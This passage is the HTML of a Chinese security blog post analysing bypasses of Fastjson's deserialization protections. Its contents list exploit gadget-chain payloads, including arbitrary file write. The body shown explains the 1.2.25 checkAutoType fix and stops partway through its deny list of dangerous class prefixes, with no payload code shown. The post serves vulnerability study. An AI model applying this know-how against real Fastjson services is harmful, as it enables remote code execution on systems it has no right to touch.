@@ -1,0 +1,1193 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>Fastjson后续版本绕过分析 | Wileysec&#39;s Blog</title>
+
+
+    <meta name="keywords" content="Java安全, Fastjson, alibaba">
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="fastjson&lt;&#x3D;1.2.25版本绕过fastjson1.2.25对之前的反序列化漏洞进行了修复，引入了 checkAutoType 机制，默认 autoTypeSupport 没有进行设置，是false，不能反序列化任何类，若开启，也会根据黑名单来判断是否能够反序列化 具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.41 fas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson后续版本绕过分析">
+<meta property="og:url" content="https://wileysec.github.io/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/13f085f1e890.html">
+<meta property="og:site_name" content="Wileysec&#39;s Blog">
+<meta property="og:description" content="fastjson&lt;&#x3D;1.2.25版本绕过fastjson1.2.25对之前的反序列化漏洞进行了修复，引入了 checkAutoType 机制，默认 autoTypeSupport 没有进行设置，是false，不能反序列化任何类，若开启，也会根据黑名单来判断是否能够反序列化 具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.41 fas">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230803211856588.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230803213415211.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230803213718112.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230803214141102.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230803214421162.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230803215506286.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230803215602372.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230803220113643.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230804103810086.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230804101021069.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230804102053020.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230804102704748.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230804103200858.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230804112841653.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230804163217608.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230805101310923.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230805101649795.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230806130938110.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230806135043506.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230806135641544.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807102902664.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807103448992.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807104011090.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807104601374.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807104927532.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807105118340.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807105145113.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807105211879.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807105253819.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807110526156.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807110741540.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807111916601.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807111948388.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807153748378.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230807152937258.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230808092000389.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230808091729818.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230808091929051.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230808093422645.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230809100538474.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230809100709490.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230809104230864.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230809105628553.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230809105730718.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230809110848893.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230809111010275.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230809111054040.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230809111222072.png">
+<meta property="article:published_time" content="2023-08-03T08:12:01.322Z">
+<meta property="article:modified_time" content="2023-08-25T18:05:34.480Z">
+<meta property="article:author" content="wileysec">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="Fastjson">
+<meta property="article:tag" content="alibaba">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wileysec.github.io/images/image-20230803211856588.png">
+
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+
+    
+    
+    
+    
+        <link rel="stylesheet" id="hl-default-theme" href="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/themes/prism-tomorrow.min.css" media="none" >
+        
+    
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/line-numbers/prism-line-numbers.min.css" media="none" onload="this.media='all'">
+    
+
+
+    
+    
+<link rel="stylesheet" href="/css/style/dark.css">
+
+    
+<script src="/js/darkmode.js"></script>
+
+
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <body>
+        <div id="app" tabindex="-1">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">Wiley&#39;s Blog</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/" class="navbar-menu button">首页</a>
+                
+                    <a href="/tags/" class="navbar-menu button">标签</a>
+                
+                    <a href="/archives/" class="navbar-menu button">归档</a>
+                
+                    <a href="/links/" class="navbar-menu button">链接</a>
+                
+                    <a href="/about/" class="navbar-menu button">关于我</a>
+                
+            </div>
+        
+        
+        
+    <a href="/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+    <a href="javaScript:void(0);" id="btn-toggle-dark">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/" class="dropdown-menu button">首页</a>
+                
+                    <a href="/tags/" class="dropdown-menu button">标签</a>
+                
+                    <a href="/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a href="/links/" class="dropdown-menu button">链接</a>
+                
+                    <a href="/about/" class="dropdown-menu button">关于我</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        Fastjson后续版本绕过分析
+    </h1>
+    <div class="post-title__meta">
+        <a href="/archives/2023/08/" class="post-meta__date button">文章创建于 2023-08-03</a>
+        
+    <span class="separate-dot"></span><a href="/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/" class="button">Java安全,技术分享</a>
+
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-x3D-1-2-25%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-text">fastjson&lt;&#x3D;1.2.25版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E5%88%86%E6%9E%90"><span class="toc-text">修复方案分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-x3D-1-2-42%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-text">fastjson&lt;&#x3D;1.2.42版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E5%88%86%E6%9E%90-1"><span class="toc-text">修复方案分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-1"><span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-x3D-1-2-43%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-text">fastjson&lt;&#x3D;1.2.43版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E5%88%86%E6%9E%90-2"><span class="toc-text">修复方案分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-2"><span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-x3D-1-2-45%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-text">fastjson&lt;&#x3D;1.2.45版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E5%88%86%E6%9E%90-3"><span class="toc-text">修复方案分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-3"><span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-x3D-1-2-47%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-text">fastjson&lt;&#x3D;1.2.47版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-4"><span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-x3D-1-2-80%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="toc-text">fastjson&lt;&#x3D;1.2.80绕过分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E5%88%86%E6%9E%90-4"><span class="toc-text">修复方案分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-5"><span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BEPayload"><span class="toc-text">反序列化链Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-text">JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl"><span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JndiDataSourceFactory"><span class="toc-text">JndiDataSourceFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleJndiBeanFactory"><span class="toc-text">SimpleJndiBeanFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DefaultBeanFactoryPointcutAdvisor"><span class="toc-text">DefaultBeanFactoryPointcutAdvisor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WrapperConnectionPoolDataSource"><span class="toc-text">WrapperConnectionPoolDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JndiRefForwardingDataSource"><span class="toc-text">JndiRefForwardingDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InetAddress"><span class="toc-text">InetAddress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Inet6Address"><span class="toc-text">Inet6Address</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL"><span class="toc-text">URL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONObject"><span class="toc-text">JSONObject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLReader"><span class="toc-text">URLReader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoCloseable-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-text">AutoCloseable 任意文件写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BasicDataSource"><span class="toc-text">BasicDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JndiConverter"><span class="toc-text">JndiConverter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JtaTransactionConfig"><span class="toc-text">JtaTransactionConfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JndiObjectFactory"><span class="toc-text">JndiObjectFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AnterosDBCPConfig"><span class="toc-text">AnterosDBCPConfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AnterosDBCPConfig2"><span class="toc-text">AnterosDBCPConfig2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CacheJndiTmLookup"><span class="toc-text">CacheJndiTmLookup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoCloseable-%E6%B8%85%E7%A9%BA%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6"><span class="toc-text">AutoCloseable 清空指定文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoCloseable-%E6%B8%85%E7%A9%BA%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6-1"><span class="toc-text">AutoCloseable 清空指定文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoCloseable-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-1"><span class="toc-text">AutoCloseable 任意文件写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoCloseable-MarshalOutputStream-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-text">AutoCloseable MarshalOutputStream 任意文件写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BasicDataSource-1"><span class="toc-text">BasicDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HikariConfig"><span class="toc-text">HikariConfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HikariConfig-1"><span class="toc-text">HikariConfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SessionBeanProvider"><span class="toc-text">SessionBeanProvider</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JMSContentInterceptor"><span class="toc-text">JMSContentInterceptor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ContextClassLoaderSwitcher"><span class="toc-text">ContextClassLoaderSwitcher</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OracleManagedConnectionFactory"><span class="toc-text">OracleManagedConnectionFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDIConfiguration"><span class="toc-text">JNDIConfiguration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JDBC4Connection"><span class="toc-text">JDBC4Connection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LoadBalancedMySQLConnection"><span class="toc-text">LoadBalancedMySQLConnection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UnpooledDataSource"><span class="toc-text">UnpooledDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LoadBalancedMySQLConnection2"><span class="toc-text">LoadBalancedMySQLConnection2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ReplicationMySQLConnection"><span class="toc-text">ReplicationMySQLConnection</span></a></li></ol></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">Article Directory</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-x3D-1-2-25%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-text">fastjson&lt;&#x3D;1.2.25版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E5%88%86%E6%9E%90"><span class="toc-text">修复方案分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-x3D-1-2-42%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-text">fastjson&lt;&#x3D;1.2.42版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E5%88%86%E6%9E%90-1"><span class="toc-text">修复方案分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-1"><span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-x3D-1-2-43%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-text">fastjson&lt;&#x3D;1.2.43版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E5%88%86%E6%9E%90-2"><span class="toc-text">修复方案分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-2"><span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-x3D-1-2-45%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-text">fastjson&lt;&#x3D;1.2.45版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E5%88%86%E6%9E%90-3"><span class="toc-text">修复方案分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-3"><span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-x3D-1-2-47%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-text">fastjson&lt;&#x3D;1.2.47版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-4"><span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-x3D-1-2-80%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="toc-text">fastjson&lt;&#x3D;1.2.80绕过分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E5%88%86%E6%9E%90-4"><span class="toc-text">修复方案分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-5"><span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BEPayload"><span class="toc-text">反序列化链Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-text">JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl"><span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JndiDataSourceFactory"><span class="toc-text">JndiDataSourceFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleJndiBeanFactory"><span class="toc-text">SimpleJndiBeanFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DefaultBeanFactoryPointcutAdvisor"><span class="toc-text">DefaultBeanFactoryPointcutAdvisor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WrapperConnectionPoolDataSource"><span class="toc-text">WrapperConnectionPoolDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JndiRefForwardingDataSource"><span class="toc-text">JndiRefForwardingDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InetAddress"><span class="toc-text">InetAddress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Inet6Address"><span class="toc-text">Inet6Address</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL"><span class="toc-text">URL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONObject"><span class="toc-text">JSONObject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLReader"><span class="toc-text">URLReader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoCloseable-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-text">AutoCloseable 任意文件写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BasicDataSource"><span class="toc-text">BasicDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JndiConverter"><span class="toc-text">JndiConverter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JtaTransactionConfig"><span class="toc-text">JtaTransactionConfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JndiObjectFactory"><span class="toc-text">JndiObjectFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AnterosDBCPConfig"><span class="toc-text">AnterosDBCPConfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AnterosDBCPConfig2"><span class="toc-text">AnterosDBCPConfig2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CacheJndiTmLookup"><span class="toc-text">CacheJndiTmLookup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoCloseable-%E6%B8%85%E7%A9%BA%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6"><span class="toc-text">AutoCloseable 清空指定文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoCloseable-%E6%B8%85%E7%A9%BA%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6-1"><span class="toc-text">AutoCloseable 清空指定文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoCloseable-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-1"><span class="toc-text">AutoCloseable 任意文件写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoCloseable-MarshalOutputStream-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-text">AutoCloseable MarshalOutputStream 任意文件写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BasicDataSource-1"><span class="toc-text">BasicDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HikariConfig"><span class="toc-text">HikariConfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HikariConfig-1"><span class="toc-text">HikariConfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SessionBeanProvider"><span class="toc-text">SessionBeanProvider</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JMSContentInterceptor"><span class="toc-text">JMSContentInterceptor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ContextClassLoaderSwitcher"><span class="toc-text">ContextClassLoaderSwitcher</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OracleManagedConnectionFactory"><span class="toc-text">OracleManagedConnectionFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDIConfiguration"><span class="toc-text">JNDIConfiguration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JDBC4Connection"><span class="toc-text">JDBC4Connection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LoadBalancedMySQLConnection"><span class="toc-text">LoadBalancedMySQLConnection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UnpooledDataSource"><span class="toc-text">UnpooledDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LoadBalancedMySQLConnection2"><span class="toc-text">LoadBalancedMySQLConnection2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ReplicationMySQLConnection"><span class="toc-text">ReplicationMySQLConnection</span></a></li></ol></li></ol>
+    </div>
+
+
+<article class="post post__with-toc content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <h2 id="fastjson-lt-x3D-1-2-25版本绕过"><a href="#fastjson-lt-x3D-1-2-25版本绕过" class="headerlink" title="fastjson&lt;&#x3D;1.2.25版本绕过"></a>fastjson&lt;&#x3D;1.2.25版本绕过</h2><p>fastjson1.2.25对之前的反序列化漏洞进行了修复，引入了 <code>checkAutoType</code> 机制，默认 <code>autoTypeSupport</code> 没有进行设置，是false，不能反序列化任何类，若开启，也会根据黑名单来判断是否能够反序列化</p>
+<p>具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.41</p>
+<p>fastjson1.2.25以后版本，在 <code>com.alibaba.fastjson.parser.ParserConfig</code> 类中增加了以下的安全机制</p>
+<p><img src="/images/image-20230803211856588.png" alt="image-20230803211856588"></p>
+<p><code>autoTypeSupport</code> 变量用来表示是否支持反序列化任意类，默认为false</p>
+<p><code>denyList</code> 变量是反序列化类全限定类名前缀的黑名单</p>
+<p><code>acceptList</code> 变量是反序列化类全限定类名前缀的白名单</p>
+<p>白名单 <code>acceptList</code> 默认是空的，黑名单 <code>denyList</code> 包含以下关键字</p>
+<pre class="line-numbers language-none"><code class="language-none">bsh
+com.mchange
+com.sun.
+java.lang.Thread
+java.net.Socket
+java.rmi
+javax.xml
+org.apache.bcel
+org.apache.commons.beanutils
+org.apache.commons.collections.Transformer
+org.apache.commons.collections.functors
+org.apache.commons.collections4.comparators
+org.apache.commons.fileupload
+org.apache.myfaces.context.servlet
+org.apache.tomcat
+org.apache.wicket.util
+org.codehaus.groovy.runtime
+org.hibernate
+org.jboss
+org.mozilla.javascript
+org.python.core
